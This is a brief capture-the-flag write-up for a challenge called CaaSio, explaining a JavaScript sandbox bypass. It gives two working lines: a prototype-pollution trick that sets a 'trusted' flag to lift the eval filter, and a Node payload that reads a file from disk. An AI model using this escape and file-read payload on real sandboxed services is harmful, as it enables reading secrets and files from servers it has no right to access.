# CaaSio

This was a cool JavaScript sandbox bypass problem.

I originally thought the solution required doing something with [`__defineGetter__`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/__defineGetter__) and [`__lookupGetter__`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/__lookupGetter__), but realized that you couldn't use `__defineGetter__` on frozen objects.

Eventually, I figured out a way to abuse the permissive regular expression (with a lot of testing on [regex101](https://regex101.com/)), arrow functions, and scoping rules to set a prototype for the `trusted` attribute. This is demonstrated with the two lines below that will get the flag:

```js
// Set Object.__proto__.trusted = 1 to pass user.trusted check, which removes
// all filters from eval-ed code.
((Math)=>Math.trusted=1)(Math.__proto__)

// Use a simple Node file-read payload once the filter has been lifted.
global.process.mainModule.require('fs').readFileSync('/ctf/flag.txt').toString('utf8')
```
